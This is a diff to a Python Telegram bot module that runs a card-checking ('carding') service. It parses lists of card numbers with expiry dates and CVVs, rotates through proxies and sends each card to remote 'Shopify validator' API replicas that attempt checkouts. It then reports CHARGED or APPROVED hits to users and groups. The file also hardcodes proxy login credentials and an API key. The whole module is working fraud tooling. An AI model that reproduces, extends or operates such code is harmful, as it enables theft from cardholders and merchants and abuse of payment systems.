@@ -1,4 +1,4 @@
-import sys
+import re
 import urllib.parse
 if sys.platform == "win32":
     try:
@@ -31,6 +31,7 @@ from typing import Optional, Tuple, List
 from io import BytesIO
 from collections import deque, defaultdict
 from html import escape as html_escape
+from urllib.parse import quote, unquote, urlsplit, urlunsplit
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # AIogram Imports
@@ -73,13 +74,6 @@ BUTTON_LOCK_SECONDS = 30
 # ══════════════════════════════════════════════════════════
 # v4.6.7 — 4-REPLICA API CLUSTER
 # ══════════════════════════════════════════════════════════
-# All four replicas of the Shopify validator API. process_card_api()
-# will try them in randomised order, skipping any that are currently
-# in cooldown (see _API_ENDPOINT_COOLDOWN below).
-#
-# MSH_API_KEY must match the API_KEYS value in each replica's .env.
-# The api.py default is "oozaruhshop" — override via env var if you
-# changed it on the deployments.
 API_ENDPOINTS = [
     "https://shopi-production-8424.up.railway.app",
     "https://web-production-28654.up.railway.app",
@@ -93,28 +87,24 @@ MSH_API_KEY = os.environ.get("MSH_API_KEY", "oozaruhshop").strip()
 _API_ENDPOINT_COOLDOWN: dict[str, float] = {}
 _API_ENDPOINT_FAIL_COUNT: dict[str, int] = defaultdict(int)
 
+
 def _mark_endpoint_failed(base: str) -> None:
-    """Record an endpoint-level failure (401/404/5xx/connection/timeout)
-    and set an increasing cooldown so subsequent calls prefer healthy
-    replicas."""
     n = _API_ENDPOINT_FAIL_COUNT[base] + 1
     _API_ENDPOINT_FAIL_COUNT[base] = n
-    cooldown = min(30 * (2 ** min(n - 1, 6)), 1800)  # 30s → 1800s cap
+    cooldown = min(30 * (2 ** min(n - 1, 6)), 1800)
     _API_ENDPOINT_COOLDOWN[base] = time.time() + cooldown
     logging.warning(f"[MSH API] endpoint DOWN: {base} "
                     f"(fail #{n}, cooldown {cooldown}s)")
 
+
 def _mark_endpoint_ok(base: str) -> None:
-    """Reset health on a successful 200-OK response."""
     if base in _API_ENDPOINT_COOLDOWN or base in _API_ENDPOINT_FAIL_COUNT:
         logging.info(f"[MSH API] endpoint recovered: {base}")
     _API_ENDPOINT_COOLDOWN.pop(base, None)
     _API_ENDPOINT_FAIL_COUNT[base] = 0
 
+
 def _ordered_endpoints() -> list[str]:
-    """Shuffle all endpoints so load spreads across replicas, then
-    move any in-cooldown endpoints to the end (they are still tried if
-    every healthy replica also fails)."""
     shuffled = list(API_ENDPOINTS)
     random.shuffle(shuffled)
     now = time.time()
@@ -122,57 +112,64 @@ def _ordered_endpoints() -> list[str]:
     cooling = [e for e in shuffled if _API_ENDPOINT_COOLDOWN.get(e, 0) > now]
     return healthy + cooling
 
+
 MSH_SESSIONS = {}
 SESSION_LOCKS = {}
 
 _MSH_HTTP_SESSION = None
 
+
 def _get_msh_http_session():
+    """Return a live ClientSession, creating a new one if the previous
+    session was closed (e.g. after a network error)."""
     global _MSH_HTTP_SESSION
-    if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
-        _MSH_HTTP_SESSION = aiohttp.ClientSession(
-            timeout=aiohttp.ClientTimeout(total=60),
-            connector=aiohttp.TCPConnector(limit=1000, ssl=False)
-        )
+    try:
+        if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
+            _MSH_HTTP_SESSION = aiohttp.ClientSession(
+                timeout=aiohttp.ClientTimeout(total=60),
+                connector=aiohttp.TCPConnector(limit=1000, ssl=False)
+            )
+    except Exception as e:
+        logging.error(f"[MSH API] Could not create HTTP session: {e}")
+        raise
     return _MSH_HTTP_SESSION
+
 
 _MSH_SESSION_MAX_AGE = 3600
 
+
 def _cleanup_msh_sessions():
-    import time as _t
-    cutoff = _t.time() - _MSH_SESSION_MAX_AGE
+    cutoff = time.time() - _MSH_SESSION_MAX_AGE
     dead = [sid for sid, s in list(MSH_SESSIONS.items())
             if s.get('status') in ('FINISHED', 'STOPPED') and s.get('start_time', 0) < cutoff]
     for sid in dead:
         MSH_SESSIONS.pop(sid, None)
         SESSION_LOCKS.pop(sid, None)
 
+
 def _start_msh_gc():
-    import time as _t
     def _loop():
         while True:
-            _t.sleep(600)
-            try: _cleanup_msh_sessions()
-            except Exception: pass
+            time.sleep(600)
+            try:
+                _cleanup_msh_sessions()
+            except Exception:
+                pass
     _threading.Thread(target=_loop, daemon=True, name='msh_gc').start()
+
 
 _start_msh_gc()
 
+
 def invalidate_sites_cache():
     """No-op: msh.py reads `global_sites` from DB on every `get_sites()`
-    call, so there is no cache to invalidate.
-
-    Kept for backward compatibility with sitechk.py, which imports this
-    by name. Removing it would break sitechk.py's import at module load.
-    """
+    call, so there is no cache to invalidate."""
     pass
 
 
 router = Router()
 
 # ── Legacy import kept for module-load ordering with sitechk.py ────────────
-# sitechk.py imports shopify_api at module load; keeping this import here
-# ensures shopify_api's side-effects run first if msh.py is loaded first.
 try:
     from shopify_api import get_active_server, API_SERVERS
 except ImportError:
@@ -181,20 +178,21 @@ except ImportError:
     from shopify_api import get_active_server, API_SERVERS
 
 
-# ── PERMANENT FAKE SITE BLACKLIST ──────────────────────────────────────────────
+# ── PERMANENT FAKE SITE BLACKLIST ──────────────────────────────────────────
 _BLACKLIST_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "blacklisted_sites.txt")
 
+
 def _load_blacklist():
-    """Load permanently blacklisted fake-charge sites from file."""
     if os.path.exists(_BLACKLIST_FILE):
         with open(_BLACKLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
             return set(line.strip() for line in f if line.strip())
     return set()
 
+
 def _save_to_blacklist(site):
-    """Permanently blacklist a fake-charge site."""
     with open(_BLACKLIST_FILE, "a", encoding="utf-8") as f:
         f.write(site.strip() + "\n")
+
 
 GLOBAL_BLACKLISTED_SITES = _load_blacklist()
 
@@ -206,12 +204,17 @@ class MshResultCallback(CallbackData, prefix="mshr"):
     session_id: str
     result_type: str
 
+
 class MshStopCallback(CallbackData, prefix="mshs"):
     session_id: str
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # PROXY MANAGER CLASS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+MAX_PROXIES_PER_SESSION = 2000
+
 
 class ProxyManager:
     """
@@ -251,9 +254,16 @@ class ProxyManager:
 
     def __init__(self, proxies_list: List[str], session_id: str):
         self.session_id = session_id
-        self.raw_proxies = list(set(proxies_list))
+        deduped = list(set(proxies_list))
 
-        self.all_proxies = [self._normalize_proxy(p) for p in self.raw_proxies]
+        # Cap so a 5k-proxy user doesn't burn CPU on the cooldown scan
+        # every get_next_proxy() call.
+        if len(deduped) > MAX_PROXIES_PER_SESSION:
+            random.shuffle(deduped)
+            deduped = deduped[:MAX_PROXIES_PER_SESSION]
+
+        self.raw_proxies = deduped
+        self.all_proxies = [self._normalize_proxy(p) for p in deduped]
         self.all_proxies = [p for p in self.all_proxies if p]
 
         self.proxy_queue = deque(self.all_proxies)
@@ -262,7 +272,39 @@ class ProxyManager:
         self.total_uses = 0
         self.cooldown_seconds = 60
 
-        logging.info(f"[ProxyManager] Initialized with {len(self.all_proxies)} normalized proxies for session {session_id}")
+        logging.info(
+            f"[ProxyManager] Initialized with {len(self.all_proxies)} "
+            f"normalized proxies for session {session_id}"
+        )
+
+    @staticmethod
+    def _sanitize_proxy_url(url: str) -> str:
+        """Normalise a fully-formed proxy URL: URL-encode the user/password
+        components (so raw '&', '%', '@' from DEFAULT_PROXIES / db_format
+        round-trips correctly) and strip default ports."""
+        if not url:
+            return url
+        if '://' not in url:
+            url = 'http://' + url
+        try:
+            parts = urlsplit(url)
+        except Exception:
+            return url
+        if not parts.hostname:
+            return url
+        try:
+            port = parts.port
+        except ValueError:
+            return url
+        host = parts.hostname
+        if parts.username is not None:
+            user = quote(unquote(parts.username or ''), safe='')
+            pwd = quote(unquote(parts.password or ''), safe='')
+            netloc = f'{user}:{pwd}@{host}:{port}' if parts.password is not None \
+                     else f'{user}@{host}:{port}'
+        else:
+            netloc = f'{host}:{port}' if port is not None else host
+        return urlunsplit((parts.scheme, netloc, parts.path, parts.query, parts.fragment))
 
     def _normalize_proxy(self, proxy: str) -> Optional[str]:
         if not proxy or not proxy.strip():
@@ -270,25 +312,36 @@ class ProxyManager:
 
         proxy = proxy.strip()
 
+        # Full URL — sanitise password encoding so raw '&' / '%' are safe.
         if proxy.startswith(('http://', 'https://')):
-            return proxy
+            return self._sanitize_proxy_url(proxy)
+
         if proxy.startswith('socks5://'):
-            return 'http://' + proxy[9:]
+            # aiohttp / curl_cffi both handle socks5, but our engine
+            # (requests fallback) doesn't — reject for consistency.
+            return None
 
+        # `user:pass@host:port` (already URL-encoded in db_format)
         if '@' in proxy and ':' in proxy.split('@')[0]:
-            return f'http://{proxy}'
+            return self._sanitize_proxy_url(f'http://{proxy}')
 
+        # proxy.py db_format is `user pass host port` (space-separated).
+        # `user == "-" and pwd == "-"` is the no-auth placeholder.
         parts = proxy.split()
         if len(parts) == 4:
             user, pwd, host, port = parts
+            if user == "-" and pwd == "-":
+                return f'http://{host}:{port}'
+            # db_format already URL-encodes user/pwd via proxy.py `build_dict`.
             return f'http://{user}:{pwd}@{host}:{port}'
 
+        # `ip:port` (no auth)
         if ':' in proxy and '@' not in proxy:
             parts = proxy.split(':')
             if len(parts) == 2 and parts[1].isdigit():
                 return f'http://{proxy}'
 
-        return f'http://{proxy}'
+        return self._sanitize_proxy_url(proxy)
 
     def get_next_proxy(self) -> Optional[Tuple[str, bool]]:
         if not self.all_proxies:
@@ -317,7 +370,6 @@ class ProxyManager:
 
             self.proxy_queue.append(proxy)
             self.total_uses += 1
-
             return proxy, True
 
         if self.failed_proxies:
@@ -405,7 +457,6 @@ class ProxyManager:
     def get_stats(self) -> dict:
         active_count = len([p for p in self.all_proxies if p not in self.failed_proxies])
         failed_count = len(self.failed_proxies)
-
         return {
             'total_proxies': len(self.all_proxies),
             'active': active_count,
@@ -437,13 +488,8 @@ def mask_proxy(proxy: str) -> str:
     except:
         return "***"
 
+
 def build_user_link(user_obj) -> str:
-    """
-    Returns a properly clickable HTML hyperlink for the user.
-    Uses https://t.me/username when username is available (works in all groups).
-    Falls back to tg://user?id= for users without a username.
-    Name is HTML-escaped to prevent Telegram parse errors with special characters.
-    """
     name = html_escape(user_obj.first_name or "User")
     if user_obj.username:
         return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
@@ -494,6 +540,7 @@ def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
             return cc, month, yy, cvv
     return None
 
+
 def extract_cards_from_text(text: str) -> List[str]:
     patterns = [
         r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
@@ -519,6 +566,7 @@ def extract_cards_from_text(text: str) -> List[str]:
                     cards.append(card_string)
     return cards
 
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -531,6 +579,7 @@ def log_hit_to_mshh(user_id, username, first_name):
             f.write(f"{user_id}|{u_name}|{f_name}\n")
     except Exception as e:
         logging.error(f"Error writing to mshh.txt: {e}")
+
 
 # ══════════════════════════════════════════
 # RETRY ERRORS - Site/Step Issues (Retry with NEW SITE)
@@ -554,8 +603,8 @@ RETRY_ERRORS = [
     'payment method not available', 'site not supported', 'captcha_required',
     'payments_credit_card_brand_not_supported', 'delivery_delivery_line_detail_changed',
     'delivery_no_delivery_strategy_available_for_mercha', 'delivery_no_delivery_strategy_available',
-    'delivery_address', 'artifacts on the seller proposal', 'amount_too_small', '<b>Proxy Dead!</b>', 
-    'tokenization blocked: 403 Forbidden (proxy/IP blocked)', 'stableId not found in checkout HTML', 'UNKNOWN', 
+    'delivery_address', 'artifacts on the seller proposal', 'amount_too_small', '<b>Proxy Dead!</b>',
+    'tokenization blocked: 403 Forbidden (proxy/IP blocked)', 'stableId not found in checkout HTML', 'UNKNOWN',
     'checkout GET', 'NO_PRODUCT_FOUND', 'found 1 products, all 1 checkouts returned site errors (CAPTCHA_METADATA_MISSING) (9.1s)',
      'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'No receipt in submit response (type: TooManyRequests)',
     'step 0 failed',
@@ -602,38 +651,44 @@ REACTIONS = [
     "tickle", "tired", "wave", "wink", "yay", "yes"
 ]
 
+
 def is_session_stopped(session_id: str) -> bool:
     session = MSH_SESSIONS.get(session_id)
     if not session:
         return True
     return session.get('status') == "STOPPED"
 
+
 def is_buttons_locked(session_id: str) -> bool:
     session = MSH_SESSIONS.get(session_id)
-    if not session: return False
+    if not session:
+        return False
     elapsed = time.time() - session.get('start_time', 0)
     return elapsed < BUTTON_LOCK_SECONDS
 
+
 def get_remaining_lock(session_id: str) -> int:
     session = MSH_SESSIONS.get(session_id)
-    if not session: return 0
+    if not session:
+        return 0
     elapsed = time.time() - session.get('start_time', 0)
     remaining = BUTTON_LOCK_SECONDS - elapsed
     return max(0, int(remaining) + 1)
 
+
 async def get_anime_gif():
-    import aiohttp
     reaction = random.choice(REACTIONS)
     api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=10) as resp:
+            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                 if resp.status == 200:
                     data = await resp.json()
                     return data.get("url")
     except Exception as e:
         logging.error(f"Error fetching anime gif: {e}")
     return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7h5xS3yCjQ8I/giphy.gif"
+
 
 async def get_user_plan_name(user_id):
     is_premium, _ = get_premium_status(user_id)
@@ -647,9 +702,12 @@ async def get_user_plan_name(user_id):
                 conn.close()
                 if row:
                     p = row['plan'].lower()
-                    if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
-                    if "elite" in p: return "𝗘𝗹𝗶𝘁𝗲 <tg-emoji emoji-id='5278751923338490157'>⭐</tg-emoji>"
-                    if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
+                    if "root" in p:
+                        return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
+                    if "elite" in p:
+                        return "𝗘𝗹𝗶𝘁𝗲 <tg-emoji emoji-id='5278751923338490157'>⭐</tg-emoji>"
+                    if "core" in p:
+                        return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
                     return row['plan']
                 return "PREMIUM"
             return await asyncio.to_thread(_sync_fetch)
@@ -659,12 +717,14 @@ async def get_user_plan_name(user_id):
     else:
         return "TRIAL"
 
+
 DEFAULT_PROXIES = [
     "http://1351:IBd1Fk5CuUNZ@p103.squidproxies.com:9087",
     "http://1401:FVRHsSXw2DNK@p103.squidproxies.com:9238",
     "http://1439:jqvFsDEZ&%Sm@p102.squidproxies.com:9292",
     "http://1439:jqvFsDEZ&%Sm@p103.squidproxies.com:9291",
 ]
+
 
 async def get_user_proxies(user_id):
     proxies = []
@@ -683,6 +743,7 @@ async def get_user_proxies(user_id):
         proxies = DEFAULT_PROXIES[:]
     return proxies
 
+
 def luhn_check(card_number: str) -> bool:
     card_number = str(card_number).strip()
     if not card_number.isdigit():
@@ -697,6 +758,7 @@ def luhn_check(card_number: str) -> bool:
                 digit -= 9
         total += digit
     return total % 10 == 0
+
 
 def is_expired(mm: str, yy: str) -> bool:
     try:
@@ -714,17 +776,13 @@ def is_expired(mm: str, yy: str) -> bool:
     except ValueError:
         return True
 
+
 def get_sites():
     """
     Read validated sites for /msh.
 
-    v4.6.6 fix (Fix 1): read MongoDB `global_sites` first, then sites.txt.
-
-    Root cause of the "sites can't be reached / sites.txt is empty" bug:
-    sitechk.py (/addsite and /sitechk Audit) writes validated sites into
-    MongoDB global_sites. Prior to v4.6.6 this function read ONLY sites.txt,
-    so every /msh run after an Audit/Add saw an empty pool and every card
-    in the session failed with "sites.txt is empty".
+    Read MongoDB `global_sites` first, then fall back to sites.txt.
+    Filters per-module ban list from banned_sites.json.
     """
     sites: list = []
 
@@ -766,8 +824,10 @@ def get_sites():
 
     return sites
 
+
 def get_user_display(user_obj, plan_name):
     return f"{user_obj.first_name} ({plan_name})"
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # API PROCESSING FUNCTION — 4-REPLICA FAILOVER
@@ -783,39 +843,28 @@ async def process_card_api(
         Tuple of (success, message, url, gateway, price, currency,
                   proxy_status, http_status)
 
-    v4.6.7: tries all 4 replicas. Endpoint-level failures (401, 404, 5xx,
-    connection error, timeout) mark the endpoint as down and fall over to
-    the next replica. A 200-OK response is returned immediately — card
-    responses (CARD_DECLINED, ORDER_PLACED, etc.) are NOT treated as
-    endpoint failures.
+    Fix A: uses urllib.parse.quote(..., safe="") so `@`, `&`, `%` in proxy
+           passwords round-trip correctly through the query string.
+    Fix B: re-fetches the aiohttp session on every replica attempt so a
+           session closed by a network error doesn't kill subsequent tries.
     """
-    import aiohttp
-
     cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
 
-    # Strip scheme prefix — api.py's _parse_proxy accepts either form,
-    # but keeping it scheme-less avoids double-encoding in the query string.
+    # Strip scheme prefix — api.py puts it back after decoding.
     api_proxy = proxy
     for prefix in ("http://", "https://", "socks5://"):
         if api_proxy.startswith(prefix):
             api_proxy = api_proxy[len(prefix):]
             break
 
-    # Pre-quote once; reused per endpoint.
     quoted_site = urllib.parse.quote(site, safe=":/")
     quoted_cc = urllib.parse.quote(cc_formatted, safe="|")
     quoted_key = urllib.parse.quote(MSH_API_KEY, safe="")
-    quoted_proxy = urllib.parse.quote(api_proxy, safe=":@")
+    quoted_proxy = urllib.parse.quote(api_proxy, safe="")
 
     http_status = None
     last_error = "Unknown Error"
     endpoints_tried = 0
-
-    try:
-        _http = _get_msh_http_session()
-    except Exception as ex:
-        return (False, f"Session init error: {str(ex)[:80]}", site,
-                "Shopify Payments", "0.00", "USD", "Error", None)
 
     for base in _ordered_endpoints():
         endpoints_tried += 1
@@ -828,13 +877,17 @@ async def process_card_api(
         )
 
         try:
+            _http = _get_msh_http_session()
+        except Exception as ex:
+            last_error = f"Session init error: {str(ex)[:80]}"
+            continue
+
+        try:
             async with _http.get(endpoint_url) as response:
                 http_status = response.status
 
                 if response.status == 200:
                     data = await response.json()
-
-                    # 200-OK is a real API response — this endpoint is healthy.
                     _mark_endpoint_ok(base)
 
                     gateway = data.get("Gateway", "Shopify Payments")
@@ -851,17 +904,10 @@ async def process_card_api(
                     proxy_status = "Live" if "live" in str(proxy_raw).lower() else "Dead"
 
                     return (
-                        success,
-                        api_response,
-                        site,
-                        gateway,
-                        price,
-                        "USD",
-                        proxy_status,
-                        http_status,
+                        success, api_response, site, gateway, price,
+                        "USD", proxy_status, http_status,
                     )
 
-                # Endpoint-level failure — cool this replica down and try the next.
                 _mark_endpoint_failed(base)
 
                 if response.status == 401:
@@ -895,28 +941,31 @@ async def process_card_api(
             last_error = f"Client Error: {str(ex)[:80]}"
             logging.warning(f"[MSH API] {base} client error, trying next replica")
             continue
+        except RuntimeError as ex:
+            # "Session is closed" — try a fresh session next iteration.
+            if "Session is closed" in str(ex):
+                global _MSH_HTTP_SESSION
+                _MSH_HTTP_SESSION = None
+                last_error = "HTTP session closed — will retry with fresh session"
+                logging.warning(f"[MSH API] session closed during request, resetting")
+                continue
+            last_error = f"API Exception: {str(ex)[:80]}"
+            logging.warning(f"[MSH API] {base} exception: {ex}, trying next replica")
+            continue
         except Exception as ex:
-            # JSON decode, etc. — not necessarily endpoint death, but
-            # treat it as transient and try the next replica.
             last_error = f"API Exception: {str(ex)[:80]}"
             logging.warning(f"[MSH API] {base} exception: {ex}, trying next replica")
             continue
 
-    # Every endpoint failed
     logging.error(
         f"[MSH API] all {endpoints_tried}/{len(API_ENDPOINTS)} endpoints failed for card, "
         f"last_error={last_error}"
     )
     return (
-        False,
-        last_error,
-        site,
-        "Shopify Payments",
-        "0.00",
-        "USD",
-        "Error",
-        http_status,
+        False, last_error, site, "Shopify Payments", "0.00",
+        "USD", "Error", http_status,
     )
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # RESULT FILE GENERATION
@@ -1009,6 +1058,7 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
 
     return file_buffer, filename, total_count
 
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # MESSAGE SENDING HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1035,8 +1085,6 @@ async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, bin_data, 
     for idx in range(1, len(parts)):
         parts[idx] = "x" * len(parts[idx])
     masked_cc = "|".join(parts)
-
-    masked_site = "******.com"
 
     if hit_type == "CHARGED":
         status_text = f'𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>'
@@ -1065,6 +1113,7 @@ async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, bin_data, 
     except Exception as e:
         logging.error(f"Error sending hit log: {e}")
 
+
 async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, send_to_extra: bool = True):
     """Always sends the approved hit to the user's DM (private chat)."""
     bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
@@ -1092,13 +1141,12 @@ async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_da
         f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / <tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
     )
 
-
     reply_markup = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="btcbuoy", url="https://t.me/StarkzchkBot", icon_custom_emoji_id="5042097984083330584", style="primary")]
     ])
 
     try:
-        await safe_send_animation(bot, 
+        await safe_send_animation(bot,
             chat_id=user_obj.id,
             animation=gif_url,
             caption=caption,
@@ -1110,12 +1158,11 @@ async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_da
     except Exception as e:
         logging.error(f"Error sending approved message to DM with animation: {e}. Falling back to text.")
         try:
-            await safe_send_message(bot, 
+            await safe_send_message(bot,
                 chat_id=user_obj.id,
                 text=caption,
                 parse_mode="HTML",
                 reply_markup=reply_markup,
-                
             )
         except Exception as inner_e:
             logging.error(f"Error sending approved text DM: {inner_e}")
@@ -1124,33 +1171,30 @@ async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_da
         return
 
     for target_chat in EXTRA_CHARGED_GROUP_IDS:
-        curr_caption = caption
         try:
-            await safe_send_animation(bot, 
+            await safe_send_animation(bot,
                 chat_id=target_chat,
                 animation=gif_url,
-                caption=curr_caption,
+                caption=caption,
                 parse_mode="HTML",
                 reply_markup=reply_markup
             )
         except Exception as e:
-            logging.error(f"Error sending APPROVED HIT to extra group {target_chat} with animation: {e}. Falling back to text.")
+            logging.error(f"Error sending APPROVED HIT to extra group {target_chat}: {e}. Falling back to text.")
             try:
-                await safe_send_message(bot, 
+                await safe_send_message(bot,
                     chat_id=target_chat,
-                    text=curr_caption,
+                    text=caption,
                     parse_mode="HTML",
                     reply_markup=reply_markup,
-                
                 )
             except Exception as inner_e:
                 logging.error(f"Error sending APPROVED HIT text to extra group {target_chat}: {inner_e}")
 
+
 async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name) -> bool:
-    """
-    Sends the charged hit to the user's DM (private chat) + all extra charged groups.
-    Returns True if the message reached AT LEAST ONE extra charged group.
-    """
+    """Sends the charged hit to the user's DM + all extra charged groups.
+    Returns True if it reached AT LEAST ONE extra charged group."""
     bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
     bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
     country_name = html_escape(str(bin_data.get("country", "N/A")))
@@ -1176,13 +1220,12 @@ async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_dat
         f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / <tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
     )
 
-
     reply_markup = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Starkz", url="https://t.me/StarkzchkBot", icon_custom_emoji_id="5042097984083330584", style="primary")]
     ])
 
     try:
-        await safe_send_animation(bot, 
+        await safe_send_animation(bot,
             chat_id=user_obj.id,
             animation=gif_url,
             caption=caption,
@@ -1194,37 +1237,34 @@ async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_dat
     except Exception as e:
         logging.error(f"Error sending charged DM with animation: {e}. Falling back to text.")
         try:
-            await safe_send_message(bot, 
+            await safe_send_message(bot,
                 chat_id=user_obj.id,
                 text=caption,
                 parse_mode="HTML",
                 reply_markup=reply_markup,
-                
             )
         except Exception as inner_e:
             logging.error(f"Error sending charged text DM: {inner_e}")
 
     sent_to_extra = False
     for target_chat in EXTRA_CHARGED_GROUP_IDS:
-        curr_caption = caption
         try:
-            await safe_send_animation(bot, 
+            await safe_send_animation(bot,
                 chat_id=target_chat,
                 animation=gif_url,
-                caption=curr_caption,
+                caption=caption,
                 parse_mode="HTML",
                 reply_markup=reply_markup
             )
             sent_to_extra = True
         except Exception as e:
-            logging.error(f"Error sending HIT to extra group {target_chat} with animation: {e}. Falling back to text.")
+            logging.error(f"Error sending HIT to extra group {target_chat}: {e}. Falling back to text.")
             try:
-                await safe_send_message(bot, 
+                await safe_send_message(bot,
                     chat_id=target_chat,
-                    text=curr_caption,
+                    text=caption,
                     parse_mode="HTML",
                     reply_markup=reply_markup,
-                
                 )
                 sent_to_extra = True
             except Exception as inner_e:
@@ -1232,27 +1272,30 @@ async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_dat
 
     return sent_to_extra
 
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # BUTTONS & PROGRESS MESSAGE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def get_result_buttons(session_id: str, is_running: bool = True) -> InlineKeyboardMarkup:
+    """Fix D: removed the always-false `if "msh" in ("mst", "mstr")` dead
+    branch — the elif was never reached so `checked` is the correct
+    "all" count."""
     session = MSH_SESSIONS.get(session_id, {})
     approved_count = session.get('approved', 0)
     dead_count = session.get('dead', 0)
     charged_count = session.get('charged', 0)
-    
-    if isinstance(approved_count, list): approved_count = len(approved_count)
-    if isinstance(dead_count, list): dead_count = len(dead_count)
-    if isinstance(charged_count, list): charged_count = len(charged_count)
-    
-    if "msh" in ("mst", "mstr"):
-        error_count = session.get('errors', 0)
-        if isinstance(error_count, list): error_count = len(error_count)
-        all_count = charged_count + approved_count + dead_count + error_count
-    else:
-        all_count = session.get('checked', 0)
-        if isinstance(all_count, list): all_count = len(all_count)
+
+    if isinstance(approved_count, list):
+        approved_count = len(approved_count)
+    if isinstance(dead_count, list):
+        dead_count = len(dead_count)
+    if isinstance(charged_count, list):
+        charged_count = len(charged_count)
+
+    all_count = session.get('checked', 0)
+    if isinstance(all_count, list):
+        all_count = len(all_count)
 
     buttons = []
     buttons.append([
@@ -1295,9 +1338,14 @@ def get_result_buttons(session_id: str, is_running: bool = True) -> InlineKeyboa
 
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
+
 async def update_progress_message(bot: Bot, session_id):
     session = MSH_SESSIONS.get(session_id)
     if not session:
+        return
+
+    # Guard against the tiny window between reply() and msg_id assignment.
+    if session.get('msg_id') is None:
         return
 
     current_time = time.time()
@@ -1315,15 +1363,10 @@ async def update_progress_message(bot: Bot, session_id):
 
     status_icon = "<tg-emoji emoji-id='5269531045165816230'>🔄</tg-emoji>" if session['status'] == "CHECKING" else (f"<tg-emoji emoji-id=\"{BTN_STOP_EMOJI_ID}\">🛑</tg-emoji>" if session['status'] == "STOPPED" else "<tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji>")
     status_text = session['status']
-    if status_text == "CHECKING": status_text = f"<i>{status_text}</i>"
-    elif status_text == "STOPPED": status_text = f"<b>{status_text}</b>"
-    elif status_text == "FINISHED": status_text = f"<b>{status_text}</b>"
-
-    proxy_manager = session.get('proxy_manager')
-    proxy_info = ""
-    if proxy_manager:
-        stats = proxy_manager.get_stats()
-        proxy_info = f"\n<b>𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ➛</b> <code>{stats['active']}/{stats['total_proxies']} active</code>"
+    if status_text == "CHECKING":
+        status_text = f"<i>{status_text}</i>"
+    elif status_text in ("STOPPED", "FINISHED"):
+        status_text = f"<b>{status_text}</b>"
 
     text = (
